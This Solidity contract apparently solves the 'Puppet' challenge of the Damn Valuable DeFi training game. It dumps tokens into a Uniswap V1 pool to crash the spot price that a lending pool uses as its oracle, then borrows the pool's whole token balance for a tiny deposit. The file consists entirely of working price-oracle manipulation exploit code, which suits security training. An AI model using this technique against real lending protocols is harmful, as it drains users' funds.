// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

interface IUniswapExchange {
    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient)
        external
        returns (uint256 eth_bought);
}

contract AttackerPupperPool {
    DamnValuableToken immutable token;
    PuppetPool immutable lendingPool;
    IUniswapExchange immutable uniswapExchange;
    address immutable player;

    uint256 constant PLAYER_DVT_BALANCE = 1000 ether;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100000 ether;

    constructor(address _tokenAddress, address _uniswapExchange, address _lendingPool, address _playerAddress) {
        token = DamnValuableToken(_tokenAddress);
        lendingPool = PuppetPool(_lendingPool);
        uniswapExchange = IUniswapExchange(_uniswapExchange);
        player = _playerAddress;
    }

    function attack() external payable {
        token.approve(address(uniswapExchange), PLAYER_DVT_BALANCE);

        uniswapExchange.tokenToEthTransferInput(PLAYER_DVT_BALANCE, 1, block.timestamp, address(this));

        uint256 depositRequired = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);

        lendingPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE, player);
    }

    receive() external payable {}
}
